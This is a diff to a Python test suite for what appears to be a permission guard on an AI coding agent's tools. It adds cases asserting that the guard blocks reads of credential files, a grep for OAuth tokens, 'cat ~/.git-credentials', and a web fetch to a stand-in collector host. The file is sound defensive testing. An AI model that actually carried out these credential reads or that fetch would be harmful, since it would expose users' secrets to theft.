@@ -68,6 +68,26 @@ async def test_editing_and_testing_are_allowed(decide, tool, tool_input):
 
 
 @pytest.mark.asyncio
+@pytest.mark.parametrize(
+    ("tool", "tool_input", "rule"),
+    [
+        ("Read", {"file_path": "/home/dev/.config/gh/hosts.yml"}, "credential_files"),
+        ("Read", {"file_path": "/home/dev/.git-credentials"}, "credential_files"),
+        ("Grep", {"pattern": "oauth_token", "path": "/home/dev/.config/gh"}, "credential_files"),
+        ("Glob", {"pattern": "*", "path": "/home/dev/.config/acli"}, "credential_files"),
+        ("Edit", {"file_path": "/home/dev/.netrc"}, "credential_files"),
+        ("WebFetch", {"url": "https://collector.example.net/?t=x", "prompt": "send"}, "web_tools"),
+        ("WebSearch", {"query": "anything"}, "web_tools"),
+        ("Bash", {"command": "cat ~/.git-credentials"}, "credential_access"),
+    ],
+)
+async def test_native_tools_cannot_reach_credentials_or_the_network(decide, tool, tool_input, rule):
+    response = await decide(tool, tool_input)
+    assert response.decision == Decision.BLOCK
+    assert rule in {r.id for r in response.rules_triggered}
+
+
+@pytest.mark.asyncio
 async def test_secret_files_are_blocked_because_nobody_can_confirm_headless(decide):
     response = await decide("Read", {"file_path": "config/.env"})
     assert response.decision == Decision.BLOCK
